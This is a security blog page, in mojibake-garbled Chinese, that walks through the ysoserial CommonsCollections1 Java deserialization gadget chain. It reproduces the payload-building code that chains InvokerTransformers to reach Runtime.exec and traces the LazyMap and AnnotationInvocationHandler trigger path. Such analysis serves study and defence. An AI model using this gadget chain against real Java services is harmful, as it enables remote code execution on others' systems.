<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Cache-Control content="no-transform"><meta http-equiv=Cache-Control content="no-siteapp"><meta name=generator content="Hugo 0.139.4"><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=manifest href=/favicon/site.webmanifest><link rel=mask-icon href=/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Ysoserial-CommonsCollections1 - zrquan</title>
<meta name=author content="zrquan"><meta name=description content="A minimal Hugo theme with nice theme color."><meta name=keywords content="java,deserialize"><meta property="og:title" content="Ysoserial-CommonsCollections1"><meta name=twitter:title content="Ysoserial-CommonsCollections1"><meta property="og:type" content="article"><meta property="og:url" content="https://zrquan.github.io/posts/ysoserial-cc1/"><meta property="og:description" content><meta name=twitter:description content><meta property="og:image" content="https://zrquan.github.io/img/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zrquan.github.io/img/og.png"><meta property="article:published_time" content="2021-03-02T00:00:00+08:00"><meta property="article:modified_time" content="2021-03-02T00:00:00+08:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://zrquan.github.io/assets/css/fuji.min.4c44b7b7f176c7ea2e7d3a85a954d45c0d3e801e81eacbad84c7f9575b51e65dc11b59ff1a372389e8b4e0821d6bbb5a668fe9c3e77af9418acb79126a035a1f.css integrity="sha512-TES3t/F2x+oufTqFqVTUXA0+gB6B6suthMf5V1tR5l3BG1n/Gjcjiei04IIda7taZo/pw+d6+UGKy3kSagNaHw=="></head><body data-theme=auto data-theme-auto=false><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h1 class="post-item post-title"><a href=https://zrquan.github.io/posts/ysoserial-cc1/>Ysoserial-CommonsCollections1</a></h1><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2021-03-02</span>
<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;2407 words</span>
<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/java>java</a>&nbsp;<a href=/tags/deserialize>deserialize</a>&nbsp;</span></div><div class="post-content markdown-body"><h2 id=commons-collections>Commons Collections</h2><p><a href=https://docs.oracle.com/javase/tutorial/collections/ target=_blank>Java Collections Framework</a> æ˜¯ JDK1.2 ä¸­æ·»åŠ çš„ç±»åº“ï¼Œæä¾›äº†å¾ˆå¤šé›†åˆç›¸å…³çš„æ•°æ®ç»“æ„ã€æ¥å£ã€ç®—æ³•ç­‰ï¼Œå¹¶æˆä¸ºäº† Java ä¸­å…¬è®¤çš„é›†åˆå¤„ç†æ ‡å‡†ã€‚</p><p>Commons Collections åˆ™æ˜¯ Apache å¼€å‘çš„ç¬¬ä¸‰æ–¹åº“ï¼Œæ‰©å±•äº† Java æ ‡å‡†é›†åˆåº“çš„åŠŸèƒ½ç‰¹æ€§ã€‚å…¶ä¸­ä¸€ä¸ªé‡è¦çš„ç‰¹æ€§æ˜¯ï¼š</p><pre><code class=language-text>Transforming decorators that alter each object as it is added to the collection
</code></pre><p>Commons Collections å®ç°äº†ä¸€ä¸ª TransformedMap ç±»ï¼Œè¯¥ç±»æ˜¯å¯¹ Java æ ‡å‡†æ•°æ®ç»“æ„ Map æ¥å£çš„æ‰©å±•ã€‚è¯¥ç±»å¯ä»¥åœ¨ä¸€ä¸ªå…ƒç´ è¢«åŠ å…¥åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œå…·ä½“çš„å˜æ¢é€»è¾‘ç”± Transformer ç±»å®šä¹‰ï¼ŒTransformer åœ¨ TransformedMap å®ä¾‹åŒ–æ—¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚</p><p><code>org.apache.commons.collections.Transformer</code> è¿™ä¸ªç±»å¯ä»¥æ»¡è¶³å›ºå®šçš„ç±»å‹è½¬åŒ–éœ€æ±‚ï¼Œå…¶è½¬åŒ–å‡½æ•°å¯ä»¥è‡ªå®šä¹‰å®ç°ï¼Œæ¼æ´è§¦å‘å‡½æ•°å°±æ˜¯åœ¨äºè¿™ä¸ªç‚¹ã€‚<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><h2 id=poc>POC</h2><p>é¦–å…ˆçœ‹ä¸€ä¸‹ CommonsCollections1#getObject æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨æ¥æ„é€ æ¶æ„å¯¹è±¡ï¼š</p><pre><code class=language-java>public InvocationHandler getObject(final String command) throws Exception {
    final String[] execArgs = new String[] { command };
    // åˆå§‹åŒ–ChainedTransformer
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    // Transformeræ•°ç»„ï¼Œæ„æˆæ¶æ„ä»£ç çš„å…³é”®
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
            String.class, Class[].class }, new Object[] {
            &quot;getRuntime&quot;, new Class[0] }),
        new InvokerTransformer(&quot;invoke&quot;, new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer(&quot;exec&quot;,
            new Class[] { String.class }, execArgs),
        new ConstantTransformer(1) };

    final Map innerMap = new HashMap();
    // ç”¨äºè§¦å‘transformersçš„è½¬åŒ–é€»è¾‘
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);

    return handler;
}
</code></pre><p>ä¸Šé¢çš„ä»£ç ä¸­ï¼Œåˆ©ç”¨åˆ°çš„å’Œ transformer ç‰¹æ€§ç›¸å…³çš„ç±»æœ‰ 3 ä¸ªï¼š</p><ol><li>InvokerTransformerï¼šé€šè¿‡åå°„æœºåˆ¶å®ç°è½¬åŒ–ï¼Œè¿”å›æ–°å®ä¾‹ã€‚</li><li>ConstantTransformerï¼šå°†è¾“å…¥çš„å¸¸é‡åŸå°ä¸åŠ¨åœ°è¿”å›ã€‚</li><li>ChainedTransformerï¼šå…¶ iTransformers å±æ€§æ˜¯ä¸€ä¸ª transformer æ•°ç»„ï¼Œå¯ä»¥ä¾æ¬¡æ‰§è¡Œæ¯ä¸ªå…ƒç´ çš„ transform æ–¹æ³•ï¼Œä¸”å‰ä¸€æ–¹æ³•çš„è¿”å›å€¼ä¼šä½œä¸ºåä¸€æ–¹æ³•çš„è¾“å…¥ã€‚</li></ol><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ° InvokerTransformer#transform ä¸­çš„åå°„æœºåˆ¶æ¥æ‰§è¡Œä»£ç ï¼Œè¯¥æ–¹æ³•çš„å…³é”®é€»è¾‘å¦‚ä¸‹ï¼š</p><pre><code class=language-java>Class cls = input.getClass();
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
return method.invoke(input, this.iArgs);
</code></pre><p>input æ˜¯è°ƒç”¨æ–¹æ³•æ—¶çš„å‚æ•°ï¼Œè€Œ iMethodNameã€iParamTypesã€iArgs å±æ€§å—æˆ‘ä»¬æ§åˆ¶ã€‚ä¸éš¾çœ‹å‡ºï¼Œå¦‚æœæƒ³è¦è°ƒç”¨ Runtime#exec æ¥æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ol><li>input æ˜¯ Runtime ç±»çš„å®ä¾‹</li><li>this.iMethodName = &ldquo;exec&rdquo;</li><li>this.iParamTypes = String.class</li><li>this.iArgs = command</li></ol><p>æ»¡è¶³åä¸‰ç‚¹å¹¶æ²¡æœ‰éš¾åº¦ï¼Œå› ä¸ºè¿™ä¸‰ä¸ªå±æ€§å€¼éƒ½å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œå®Œå…¨ç”±æˆ‘ä»¬æ§åˆ¶ã€‚ä½†æ­£å¸¸æƒ…å†µä¸‹ï¼Œç›®æ ‡ä¸å¯èƒ½ç”¨ Runtime å®ä¾‹ä½œä¸ºå‚æ•°ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ§åˆ¶ input çš„å€¼ã€‚</p><p>å¦å¤–è¦çŸ¥é“çš„æ˜¯ï¼ŒRuntime ç±»ä½¿ç”¨äº†å•ä¾‹æ¨¡å¼ï¼Œæ‰€ä»¥å®ƒçš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œä¸èƒ½é€šè¿‡ new
æ¥è·å–å®ä¾‹ï¼Œåªèƒ½é€šè¿‡ Runtime#getRuntime æ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è§£å†³çš„å…³é”®é—®é¢˜æ˜¯ä½¿ input
ç­‰æ•ˆäºï¼š</p><pre><code class=language-java>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))
</code></pre><h2 id=chainedtransformer>ChainedTransformer</h2><p>æƒ³è¦æ§åˆ¶ input çš„å€¼ï¼Œéœ€è¦åˆ©ç”¨ ChainedTransformer ç±»ï¼Œå…¶å…³é”®çš„ transform æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre><code class=language-java>public Object transform(Object object) {
    for(int i = 0; i &lt; this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }
    return object;
}
</code></pre><p><code>this.iTransformers</code> å±æ€§æ˜¯ä¸€ä¸ª transformer æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å±æ€§å¤šæ¬¡æ‰§è¡Œ
InvokerTransformer#transform æ–¹æ³•ã€‚ç”±äºæ‰§è¡Œæ–¹æ³•çš„è¿”å›å€¼ä¼šä½œä¸ºä¸‹ä¸€æ¬¡æ‰§è¡Œçš„è¾“å…¥ï¼Œè€Œè¿™ä¸ªè¿”å›å€¼æˆ‘ä»¬æ˜¯å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šæ§åˆ¶çš„ï¼Œä»¥æ­¤æ¥è¾¾åˆ°æ§åˆ¶ input å€¼çš„ç›®çš„ã€‚</p><p>æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬ç°åœ¨å°†ç›®çš„å·§å¦™åœ°è½¬æ¢æˆä½¿è¿”å›å€¼ï¼š</p><pre><code class=language-java>method.invoke(input, this.iArgs);
</code></pre><p>ç­‰æ•ˆäºæˆ‘ä»¬æƒ³è¦çš„ input å€¼ï¼š</p><pre><code class=language-java>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))
</code></pre><p>å›é¡¾ä¸€ä¸‹ InvokerTransformer#transformï¼š</p><pre><code class=language-java>Class cls = input.getClass();
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
return method.invoke(input, this.iArgs);
</code></pre><p>ç°åœ¨æ˜¯ä¸æ˜¯è§‰å¾—ï¼Œåªè¦è®© cls å˜é‡ç­‰äº <code>Runtime.class</code> å°±å¤§åŠŸå‘Šæˆäº†å‘¢ã€‚ä½†ä»”ç»†ä¸€æƒ³ï¼Œè¿™ä¸å°±å›åˆ°å¼€å¤´è¯´çš„è¦ input ä¸º Runtime ç±»çš„å®ä¾‹å—ğŸ˜µ</p><p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ ChainedTransformer#transform æ§åˆ¶ input å€¼ï¼Œé‚£æƒ³åŠæ³•åœ¨å‰é¢çš„å¾ªç¯ä¸­ä½¿è¿”å›å€¼æ˜¯ Runtime ç±»çš„å®ä¾‹ä¸å°±å¥½äº†ï¼Ÿæ¯”å¦‚åˆ©ç”¨å‰é¢æåˆ°çš„ ConstantTransformer ç±»ï¼š</p><figure><img src=/ox-hugo/2021-03-02_10-25-57_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_10-25-57_screenshot.png></figure><p>åªè¦åœ¨ transformer æ•°ç»„æ·»åŠ å…ƒç´  <code>new ConstantTransformer(Runtime.getRuntime())</code> ï¼Œä¸‹ä¸€æ¬¡å¾ªç¯çš„è¾“å…¥å°±æ˜¯ Runtime å®ä¾‹ã€‚</p><p>ç„¶è€Œ Runtime ç±»æ²¡æœ‰å®ç° Serializable æ¥å£ï¼š</p><figure><img src=/ox-hugo/2021-03-02_10-33-48_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_10-33-48_screenshot.png></figure><h2 id=åå°„>åå°„</h2><p>æˆ‘ä»¬æ²¡æœ‰åŠæ³•è®© Runtime å¯¹è±¡åºåˆ—åŒ–ï¼Œä½†å¯ä»¥åºåˆ—åŒ– <code>Runtime.class</code> ï¼Œä¹Ÿå°±æ˜¯
<code>java.lang.Class</code> çš„å¯¹è±¡ã€‚å‡è®¾å°† input çš„å€¼è®¾ä¸º <code>Runtime.class</code> ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„è¯­å¥å¾—åˆ° Runtime#getRuntimeï¼š</p><pre><code class=language-java>Class cls = input.getClass(); // cls == java.lang.Class
Method method = cls.getMethod(&quot;getMethod&quot;, paramTypes);
return method.invoke(input, new Object[] {&quot;getRuntime&quot;, new Class[0] });
</code></pre><p>ç°åœ¨æˆ‘ä»¬å¾—åˆ°äº† Runtime#getRuntime çš„ Method å¯¹è±¡ï¼Œå†é€šè¿‡ä»¥ä¸‹è¯­å¥æ‰§è¡Œè¿™ä¸ªæ–¹æ³•ï¼š</p><pre><code class=language-java>Class cls = input.getClass(); // input == Method(getRuntime)
Method method = cls.getMethod(&quot;invoke&quot;, paramTypes);
return method.invoke(input, args);
</code></pre><p>è¿™é‡Œå·§å¦™åœ°åˆ©ç”¨ invoke æ–¹æ³•æ¥æ‰§è¡Œ invoke æ–¹æ³•ï¼Œç›®çš„æ˜¯å°† invoke çš„æ‰§è¡Œå¯¹è±¡å’Œå‚æ•°è½¬åŒ–æˆæˆ‘ä»¬èƒ½æ§åˆ¶çš„ input å’Œ args å˜é‡ã€‚</p><p>æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ ysoserial çš„ pocï¼Œä»¥ä¾¿äºç†è§£ã€‚å…³é”®çš„ transformer æ•°ç»„å¦‚ä¸‹ï¼š</p><pre><code class=language-java>final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
        String.class, Class[].class }, new Object[] {
        &quot;getRuntime&quot;, new Class[0] }),
    new InvokerTransformer(&quot;invoke&quot;, new Class[] {
        Object.class, Object[].class }, new Object[] {
        null, new Object[0] }),
    new InvokerTransformer(&quot;exec&quot;,
        new Class[] { String.class }, execArgs),
    new ConstantTransformer(1) };
</code></pre><p>é¦–å…ˆæ˜¯ ConstantTransformer#transform æ–¹æ³•ï¼Œè¿”å› <code>Runtime.class</code> ï¼š</p><figure><img src=/ox-hugo/2021-03-02_14-06-53_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-06-53_screenshot.png></figure><p>ç¬¬ä¸€æ¬¡è°ƒç”¨ InvokerTransformer#transformï¼Œè·å– Runtime#getRuntime çš„ Method å¯¹è±¡ï¼š</p><figure><img src=/ox-hugo/2021-03-02_14-08-49_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-08-49_screenshot.png></figure><figure><img src=/ox-hugo/2021-03-02_14-10-22_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-10-22_screenshot.png></figure><p>ç¬¬äºŒæ¬¡è°ƒç”¨ InvokerTransformer#transformï¼Œè¿”å› Runtime å¯¹è±¡ï¼š</p><figure><img src=/ox-hugo/2021-03-02_14-11-58_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-11-58_screenshot.png></figure><figure><img src=/ox-hugo/2021-03-02_14-13-51_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-13-51_screenshot.png></figure><p>ä¸Šå›¾è¿˜æ³¨æ„åˆ°äº† <code>this.iArgs</code> ç¬¬ä¸€ä¸ªå€¼æ˜¯ nullï¼Œè¿™å¯¹åº”ç€ invoke æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‰ç†æ¥è¯´è¿™åº”è¯¥æ˜¯ç›®æ ‡æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ Runtime å¯¹è±¡ã€‚</p><figure><img src=/ox-hugo/2021-03-02_14-18-15_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-18-15_screenshot.png></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå½“ invoke è°ƒç”¨çš„ç›®æ ‡æ–¹æ³•æ˜¯é™æ€æ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°†æ— å…³ç´§è¦ï¼Œç›®æ ‡ç±»çš„ç›¸å…³ä¿¡æ¯å·²ç»åœ¨ä¹‹å‰çš„æ­¥éª¤è·å–äº†ã€‚</p><p>æ¯”å¦‚åœ¨ä¸Šé¢çš„æ‰§è¡Œæµç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ InvokerTransformer#transform è·å–
Runtime#getRuntime æ—¶çš„ input å˜é‡å°±æ˜¯ <code>Runtime.class</code></p><p>ç¬¬ä¸‰æ¬¡è°ƒç”¨ InvokerTransformer#transformï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼š</p><figure><img src=/ox-hugo/2021-03-02_14-25-35_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-25-35_screenshot.png></figure><figure><img src=/ox-hugo/2021-03-02_14-25-57_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_14-25-57_screenshot.png></figure><p>ç°åœ¨æˆ‘ä»¬åªè¦è°ƒç”¨ ChainedTransformer#transformï¼Œå°±èƒ½æ‰§è¡Œæ¶æ„ä»£ç äº†ï¼Œå‰©ä¸‹çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆè®©ç›®æ ‡è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•äº†ã€‚</p><h2 id=è§¦å‘ç‚¹>è§¦å‘ç‚¹</h2><h3 id=lazymap>LazyMap</h3><p>æœŸæœ›ç›®æ ‡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ç›´æ¥æ‰§è¡Œ ChainedTransformer#transform æ˜¯ä¸å¤ªç°å®çš„ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ›´å¸¸è§„çš„æ“ä½œæ¥è§¦å‘è¿™ä¸€æ–¹æ³•ï¼Œæ¯”å¦‚ Map æ•°æ®ç»“æ„çš„ç›¸å…³æ“ä½œã€‚</p><p>æ­£å¥½ Commons Collections ä¸­æä¾›äº†ä¸¤ä¸ªç±»ï¼ŒTransformedMap å’Œ LazyMapã€‚å®ƒä»¬çš„ä½œç”¨æœ‰ç‚¹ç›¸ä¼¼ï¼Œéƒ½å¯ä»¥ä¿®é¥°ä¸€ä¸ª Map æ•°æ®ï¼Œå½“å¯¹è¯¥ Map æ•°æ®è¿›è¡Œæ“ä½œæ—¶ä¼šè§¦å‘ transform è¿‡ç¨‹ã€‚</p><p>å› ä¸º ysoserial ä¸­ç”¨çš„æ˜¯ LazyMapï¼Œæ‰€ä»¥åªåˆ†æä¸€ä¸‹å®ƒçš„åˆ©ç”¨æ–¹æ³•ã€‚å®ƒçš„ get æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre><code class=language-java>public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
</code></pre><p>åœ¨ç¬¬ 3 è¡Œè°ƒç”¨äº†ä¸€ä¸ª transform æ–¹æ³•ï¼Œè€Œ <code>this.factory</code> å¯ä»¥åœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼ï¼Œæˆ‘ä»¬å°†å®ƒè®¾ç½®ä¸º ChainedTransformer å¯¹è±¡ï¼Œç„¶åæƒ³åŠæ³•è§¦å‘è¿™ä¸ª get æ–¹æ³•ã€‚</p><h3 id=annotaioninvocationhandler>AnnotaionInvocationHandler</h3><p>AnnotaionInvocationHandler ç±»çš„ååºåˆ—è¿‡ç¨‹ä¸­æœ‰ Map çš„ç›¸å…³æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥è§¦å‘
LazyMap#getã€‚æ³¨æ„ï¼Œåœ¨ JDK8 ä¹‹åå®ƒçš„ readObject æ–¹æ³•æ›´æ–°äº†(<a href=http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java target=_blank>diff</a>)ï¼Œä¸‹é¢çš„æ–¹æ³•å°±ç”¨ä¸äº†äº†ã€‚<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup></p><p>é¦–å…ˆçœ‹ä¸€ä¸‹ getObject æ–¹æ³•ä¸­çš„ä»£ç ï¼š</p><figure><img src=/ox-hugo/2021-03-02_18-03-27_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_18-03-27_screenshot.png></figure><p>çº¢æ¡†çš„ä»£ç åˆ©ç”¨äº†ä¸¤å±‚çš„åŠ¨æ€ä»£ç†æ¥å°è£… lazyMap å¯¹è±¡ï¼Œç›¸å…³æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure><img src=/ox-hugo/2021-03-02_18-08-03_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_18-08-03_screenshot.png></figure><p>ç¬¬ä¸€æ¬¡è°ƒç”¨ createMemoitizedProxy ç”Ÿæˆ mapProxy ä»£ç†å¯¹è±¡ï¼Œå°† lazyMap èµ‹ç»™å®ƒçš„ handler çš„
memberValues å±æ€§ã€‚</p><p>ç¬¬äºŒæ¬¡è°ƒç”¨ createMemoizedInvocationHandler ç”Ÿæˆ handler å¯¹è±¡ï¼Œå°† mapProxy èµ‹ç»™
memberValues å±æ€§ã€‚</p><p>å…³ç³»å¤§è‡´å¦‚ä¸‹ï¼š</p><pre><code class=language-java>handler.memberValues == mapProxy
mapProxy.handler.memberValues == lazyMap
</code></pre><h2 id=ååºåˆ—åŒ–>ååºåˆ—åŒ–</h2><p>æœ€åçœ‹ä¸€çœ‹ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯ AnnotaionInvocationHandler#readObject çš„æ‰§è¡Œæµç¨‹ã€‚</p><figure><img src=/ox-hugo/2021-03-02_18-37-03_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_18-37-03_screenshot.png></figure><p>è¿™æ—¶çš„ <code>this.memberValues</code> æ˜¯ mapProxy ä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨å®ƒçš„ entrySet æ–¹æ³•ä¼šæ‰§è¡Œå…¶ handler
çš„ invoke æ–¹æ³•ã€‚</p><p>æ¥åˆ° AnnotationInvocationHandler#invokeï¼Œæ³¨æ„è¿™æ—¶çš„ this å’Œä¹‹å‰æ˜¯ä¸åŒå®ä¾‹äº†ï¼Œè€Œ
<code>this.memberValues</code> å°±æ˜¯ lazyMap å¯¹è±¡ã€‚</p><figure><img src=/ox-hugo/2021-03-02_18-44-13_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_18-44-13_screenshot.png></figure><p>å¯ä»¥çœ‹åˆ°åœ¨ invoke æ–¹æ³•è¿™è°ƒç”¨äº† lazyMap#getï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><figure><img src=/ox-hugo/2021-03-02_18-47-58_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-02_18-47-58_screenshot.png></figure><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://xz.aliyun.com/t/7031 target=_blank>https://xz.aliyun.com/t/7031</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://juejin.cn/post/6844903997011132423 target=_blank>https://juejin.cn/post/6844903997011132423</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div></article><div class="license markdown-body"><blockquote><p>Unless otherwise noted, the content of this site is licensed under <a rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a>.</p></blockquote></div><div class=post-comment data-comment=disqus><span class=post-comment-notloaded><i class="iconfont icon-chatbox-ellipses-sharp"></i>&nbsp;Load comments</span><div id=disqus_thread style=display:none></div><script>function loadComment(){var t=document.querySelector(".post-comment"),n=function(){this.page.url="https://zrquan.github.io/posts/ysoserial-cc1/",this.page.identifier="ysoserial-cc1"},e=document.createElement("script");e.src="https://4shen0ne.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),document.querySelector("#disqus_thread").removeAttribute("style"),(document.body||document.head).appendChild(e),document.querySelector("span.post-comment-notloaded").setAttribute("style","display: none;")}</script></div></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#commons-collections>Commons Collections</a></li><li><a href=#poc>POC</a></li><li><a href=#chainedtransformer>ChainedTransformer</a></li><li><a href=#åå°„>åå°„</a></li><li><a href=#è§¦å‘ç‚¹>è§¦å‘ç‚¹</a><ul><li><a href=#lazymap>LazyMap</a></li><li><a href=#annotaioninvocationhandler>AnnotaionInvocationHandler</a></li></ul></li><li><a href=#ååºåˆ—åŒ–>ååºåˆ—åŒ–</a></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li><li><a href=/notes target=_blank><span>Notes</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>Ctf</a>
</span><span><a href=/tags/cve/>Cve</a>
</span><span><a href=/tags/deserialize/>Deserialize</a>
</span><span><a href=/tags/emacs/>Emacs</a>
</span><span><a href=/tags/fastjson/>Fastjson</a>
</span><span><a href=/tags/java/>Java</a>
</span><span><a href=/tags/kotlin/>Kotlin</a>
</span><span><a href=/tags/org-mode/>Org-Mode</a>
</span><span><a href=/tags/web/>Web</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#commons-collections>Commons Collections</a></li><li><a href=#poc>POC</a></li><li><a href=#chainedtransformer>ChainedTransformer</a></li><li><a href=#åå°„>åå°„</a></li><li><a href=#è§¦å‘ç‚¹>è§¦å‘ç‚¹</a><ul><li><a href=#lazymap>LazyMap</a></li><li><a href=#annotaioninvocationhandler>AnnotaionInvocationHandler</a></li></ul></li><li><a href=#ååºåˆ—åŒ–>ååºåˆ—åŒ–</a></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2021-2024
<a href=https://zrquan.github.io/>zrquan</a>
| <a href=https://github.com/zrquan/zrquan.github.io>Source code</a>
